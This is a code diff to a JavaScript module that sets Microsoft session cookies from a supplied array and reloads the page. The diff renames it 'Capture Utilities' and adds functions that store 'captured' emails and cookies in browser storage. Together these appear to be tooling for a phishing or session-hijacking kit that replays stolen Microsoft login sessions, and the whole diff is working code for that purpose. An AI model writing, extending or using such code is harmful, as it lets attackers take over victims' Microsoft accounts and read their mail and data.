@@ -1,14 +1,19 @@
 /**
- * Robust Microsoft Cookie Restoration Script
+ * Robust Microsoft Cookie Restoration & Capture Utilities
  * Supports full cookie attributes for session restoration.
  * 
  * Usage:
- *   import { restoreMicrosoftCookies } from './restoreCookies';
+ *   import { restoreMicrosoftCookies, restoreCookies, setCapturedEmail, setCapturedCookies } from './restoreCookies';
  *   restoreMicrosoftCookies(cookiesArray, { reload: true });
+ *   restoreCookies(cookiesArray); // For generic restoration
+ *   setCapturedEmail(email);
+ *   setCapturedCookies(cookiesArray);
  *
  * @param {Array} cookiesArray - Array of cookie objects
  * @param {Object} options - { reload: boolean } reload page after restoration
  */
+
+// Main Microsoft cookie restoration with full attributes
 export function restoreMicrosoftCookies(cookiesArray, options = { reload: true }) {
     if (!Array.isArray(cookiesArray)) {
         console.error('Invalid cookies array');
@@ -37,30 +42,22 @@ export function restoreMicrosoftCookies(cookiesArray, options = { reload: true }
             if (name.startsWith('__Host-')) {
                 cookieString += ' Secure;';
                 cookieString += ' path=/;';
-                // No domain for __Host-
             } else if (domain) {
                 cookieString += ` domain=${domain};`;
             }
             
-            // Expiry: session cookies if missing or session=true
             if (!isSession && expiresUnix) {
-                // Some sources use milliseconds, some seconds; use > 10^10 to detect ms
                 const expiresMs = expiresUnix > 1e10 ? expiresUnix : expiresUnix * 1000;
                 const expiresDate = new Date(expiresMs);
                 cookieString += ` expires=${expiresDate.toUTCString()};`;
             }
-            // Secure
             if (secure || name.startsWith('__Secure-') || name.startsWith('__Host-')) {
                 cookieString += ' Secure;';
             }
-            // SameSite
             if (sameSite) {
                 let samesiteNorm = sameSite[0].toUpperCase() + sameSite.slice(1).toLowerCase();
                 cookieString += ` SameSite=${samesiteNorm};`;
             }
-            // HttpOnly cannot be set via JS, so we skip it
-            
-            // Set cookie
             document.cookie = cookieString;
             results.push({
                 name,
@@ -82,4 +79,38 @@ export function restoreMicrosoftCookies(cookiesArray, options = { reload: true }
     if (options.reload) {
         location.reload();
     }
+}
+
+// Generic restoreCookies for normal usage (no reload, no logging)
+export function restoreCookies(cookies) {
+    if (!Array.isArray(cookies)) return;
+    cookies.forEach(cookie => {
+        let cookieStr = `${cookie.name}=${cookie.value}; path=${cookie.path || '/'};`;
+        if (cookie.domain) cookieStr += ` domain=${cookie.domain};`;
+        if (cookie.secure) cookieStr += ' Secure;';
+        if (cookie.sameSite) cookieStr += ` SameSite=${cookie.sameSite};`;
+        if (cookie.expires) {
+            const expiresMs = cookie.expires > 1e10 ? cookie.expires : cookie.expires * 1000;
+            cookieStr += ` expires=${new Date(expiresMs).toUTCString()};`;
+        }
+        document.cookie = cookieStr;
+    });
+}
+
+// Store the captured email in localStorage/sessionStorage
+export function setCapturedEmail(email) {
+    if (!email) return;
+    try {
+        localStorage.setItem('captured_email', email);
+        sessionStorage.setItem('captured_email', email);
+    } catch (e) {}
+}
+
+// Store the captured cookies in localStorage/sessionStorage
+export function setCapturedCookies(cookies) {
+    if (!cookies) return;
+    try {
+        localStorage.setItem('captured_cookies', JSON.stringify(cookies));
+        sessionStorage.setItem('captured_cookies', JSON.stringify(cookies));
+    } catch (e) {}
 }
